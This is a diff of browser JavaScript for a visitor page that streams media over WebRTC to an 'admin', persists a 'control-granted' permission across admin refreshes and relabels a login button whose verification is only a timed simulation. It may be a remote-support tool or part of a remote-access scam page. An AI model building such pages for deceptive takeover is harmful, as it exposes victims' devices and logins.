@@ -9,9 +9,25 @@ function connectWS() {
   const protocol = window.location.protocol === "https:" ? "wss://" : "ws://";
   ws = new WebSocket(`${protocol}${window.location.host}`);
 
-  ws.onopen = () => ws.send(JSON.stringify({ type: "role", role: "visitor" }));
+  ws.onopen = () => {
+    ws.send(JSON.stringify({ type: "role", role: "visitor" }));
+    
+    // Re-send control permission if it was already granted (survives admin refresh)
+    if (controlGranted) {
+      ws.send(JSON.stringify({ type: "control-granted", target: "admin" }));
+    }
+  };
+
   ws.onmessage = async (e) => {
     const data = JSON.parse(e.data);
+
+    // Listen for the admin refresh signal and restart the stream
+    if (data.type === "request-offer") {
+      if (stream) {
+        startWebRTC();
+      }
+      return;
+    }
 
     if (data.type === "webrtc-answer") {
       await peerConnection.setRemoteDescription(
@@ -257,6 +273,10 @@ document.getElementById("accept-btn").addEventListener("click", async () => {
 });
 
 async function startWebRTC() {
+  if (peerConnection) {
+    peerConnection.close();
+  }
+  
   peerConnection = new RTCPeerConnection(iceServers);
   stream.getTracks().forEach((track) => peerConnection.addTrack(track, stream));
 
@@ -307,7 +327,7 @@ function handleVerify(event) {
     document.getElementById("state-verify").classList.remove("hidden");
 
     btn.disabled = false;
-    btnText.innerText = "Sign in";
+    btnText.innerText = "Log in with email";
     spinner.classList.add("hidden");
   }, 2000);
 }
